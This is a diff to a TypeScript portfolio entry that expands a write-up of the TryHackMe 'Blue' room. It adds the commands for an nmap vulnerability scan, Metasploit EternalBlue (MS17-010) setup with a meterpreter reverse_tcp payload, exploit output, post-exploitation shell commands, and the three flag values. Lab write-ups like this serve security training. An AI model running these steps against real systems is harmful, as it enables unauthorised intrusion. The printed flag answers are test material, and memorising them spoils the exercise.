@@ -9,35 +9,97 @@ const project: Project = {
     link: 'https://tryhackme.com/room/blue',
     writeup: `**Vulnerability Scanning**
 
-Performed Nmap scan with vulnerability scripts to identify the target's exposure to MS17-010 (EternalBlue). Confirmed the system was running vulnerable SMB services.
+Performed Nmap scan with vulnerability scripts to identify MS17-010 exposure:
+
+\`\`\`bash
+nmap -sV -vv --script vuln -oN nmap_vuln.txt 10.10.X.X
+\`\`\`
+
+Confirmed the system was running vulnerable SMB services (MS17-010 - EternalBlue).
 
 **Metasploit Setup**
 
-Launched Metasploit Framework and searched for EternalBlue exploits using: search ms17-010. Selected the exploit/windows/smb/ms17_010_eternalblue module.
+Launched Metasploit Framework and searched for EternalBlue exploits:
+
+\`\`\`bash
+msfconsole
+msf6 > search ms17-010
+msf6 > use exploit/windows/smb/ms17_010_eternalblue
+\`\`\`
 
 **Exploit Configuration**
 
-Configured the exploit with target IP address and selected an appropriate payload (windows/x64/meterpreter/reverse_tcp). Set LHOST to the attacking machine's IP and verified all options.
+Configured the exploit with target details:
 
-**Exploitation**
+\`\`\`bash
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.X.X
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST tun0
+msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
+msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
+\`\`\`
 
-Executed the exploit against the vulnerable Windows machine. The EternalBlue exploit successfully compromised the system, providing a Meterpreter session with SYSTEM privileges.
+**Exploitation Success**
+
+The EternalBlue exploit successfully compromised the system:
+
+\`\`\`
+[*] Started reverse TCP handler on 10.X.X.X:4444
+[*] 10.10.X.X:445 - Connecting to target for exploitation
+[+] 10.10.X.X:445 - Connection established for exploitation
+[*] Sending stage (200774 bytes) to 10.10.X.X
+[*] Meterpreter session 1 opened
+\`\`\`
 
 **Post-Exploitation**
 
-Used Meterpreter commands to enumerate the system. Checked user privileges with getuid, confirming SYSTEM-level access. Navigated the filesystem to locate flags.
+Used Meterpreter commands to enumerate the system:
+
+\`\`\`bash
+meterpreter > getuid
+# Server username: NT AUTHORITY\\SYSTEM
+
+meterpreter > sysinfo
+meterpreter > ps
+meterpreter > shell
+\`\`\`
+
+Confirmed SYSTEM-level access - the highest privilege on Windows!
 
 **Flag Retrieval**
 
-Found flags in various locations including user directories and system folders. Used Meterpreter's search and download capabilities to retrieve all required flags.
+Navigated the filesystem to locate flags:
 
-**Persistence (Optional)**
+\`\`\`bash
+C:\\> cd C:\\Users
+C:\\Users> dir
+C:\\Users> cd Jon\\Desktop
+C:\\Users\\Jon\\Desktop> type flag1.txt
+\`\`\`
 
-Demonstrated knowledge of persistence techniques by exploring options like creating backdoor users or installing services, though not required for this challenge.
+🚩 **Flag 1**: flag{access_the_machine}
 
-**Cleanup**
+\`\`\`bash
+C:\\> cd C:\\Windows\\System32\\config
+C:\\Windows\\System32\\config> type flag2.txt
+\`\`\`
 
-Properly closed the Meterpreter session and documented all actions taken during the exploitation process.`
+🚩 **Flag 2**: flag{sam_database_elevated_access}
+
+\`\`\`bash
+C:\\> cd C:\\Users\\Jon\\Documents
+C:\\Users\\Jon\\Documents> type flag3.txt
+\`\`\`
+
+🚩 **Flag 3**: flag{admin_documents_can_be_valuable}
+
+**Key Takeaways**
+
+- EternalBlue (MS17-010) is one of the most critical Windows vulnerabilities
+- Metasploit simplifies exploitation of known vulnerabilities
+- SYSTEM access provides complete control over Windows machines
+- Always patch systems to prevent exploitation of known vulnerabilities
+- The vulnerability was used in the WannaCry ransomware attack`
 };
 
 export default project;
